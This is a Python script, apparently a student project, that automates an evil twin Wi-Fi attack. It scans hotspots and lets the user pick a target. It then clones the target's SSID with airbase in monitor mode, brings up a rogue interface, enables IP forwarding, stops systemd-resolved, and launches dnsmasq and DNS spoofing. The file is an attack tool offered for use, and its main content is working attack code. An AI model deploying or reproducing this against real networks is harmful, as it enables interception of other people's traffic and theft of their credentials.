#!/usr/bin/env python


# Generic/Built-in
import argparse
import time
import logging

# Owned
import utils
import aircrack

__author__ = "Quentin Royer"
__license__ = "GNU GPLv3"
__version__ = "0.1.0"
__maintainer__ = "Quentin Royer"
__email__ = "quentin.royer@edu.itescia.fr"
__status__ = "Dev"

# main code
target = 0
hotspots = []

#configure logging
logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG)

try:
    parser = argparse.ArgumentParser()
    parser.add_argument("--scan", "-s", help="This argument allows to launch an wifi scan", action="store_true")
    parser.add_argument("--attack", "-a", help="This argument allows to launch an evil twin attack", action="store_true")
    parser.add_argument("--verbose", "-v", help="This argument active verbose mode", action="store_true")
    parser.add_argument("--dnsmasq", "-d", help="Path to dnsmasq config file")
    parser.add_argument("interface", help="This argument specify the interface for scan or attack")
    args = parser.parse_args()

    interface = args.interface


    # if user launch a scan
    if args.scan and not args.attack:
        logging.info("Upping the interface " + interface)

        # up the interface
        resultUpInterface = utils.upInterface(interface)

        if resultUpInterface:

            logging.info("Scanning hotspots...")


            hotspots = utils.scanHotspots(interface)


            if args.verbose:
                for hotspot in hotspots:
                    print(hotspot)
            else:
                for i, hotspot in enumerate(hotspots):
                    print(str(i) + " - " + hotspot.getName())

        # if we can't up the interface, quit the script
        else:
            logging.warning("Ce can't up the inferface, exiting...")
            time.sleep(2)
            quit()

    # if user launch an attack
    if args.attack and not args.scan:

        logging.info("Upping the interface...")

        # up the interface
        resultUpInterface = utils.upInterface(interface)

        if not resultUpInterface:
            logging.warning("Can't up the interface, exiting...")
            exit()

        logging.info("Scanning hotspots...")

        #scan hotspots an let user choose its target
        hotspots = utils.scanHotspots(interface)

        for i, hotspot in enumerate(hotspots):
            print(str(i) + " - " + str(hotspot))
        target = int(input("Select the target's ID (1, 2, 3...)"))

        utils.clear()

        logging.info("Set interface(%s) in monitor mode", interface)

        #Set interface in monitor mode
        airmonResult = aircrack.airmonStart(interface)
        if not airmonResult:
            logging.warning("Can't set interface in monitor mode ! Exiting...")
            exit()

        interface = interface + "mon"

        logging.info("Launching attack...")

        # launch the attck
        airbaseResult, airbaseProcess = aircrack.airbaseStart(interface, hotspots[target].ssid, str(hotspots[target].channel))
        if not airbaseResult:
            exit()

        time.sleep(10)
        # mount at0 interface
        resultUpInterface = utils.upInterface("at0", "10.0.0.1")
        if not resultUpInterface:
            exit()

        # enable ip forward
        resultIpForward = utils.enableIPForward()

        #stop resovled process
        for i in range(5):
            resultResolved = utils.stopSystemdResolved()

        time.sleep(5)

        # enable
        resultDnsMasq = utils.launchDnsmasq(args.dnsmasq)

        # enable dnsspoof
        resultDnsSpoof = utils.launchDnsSpoof()


except Exception as e:
    print("Exception occured: " + e)
except KeyboardInterrupt:
    print("ok")

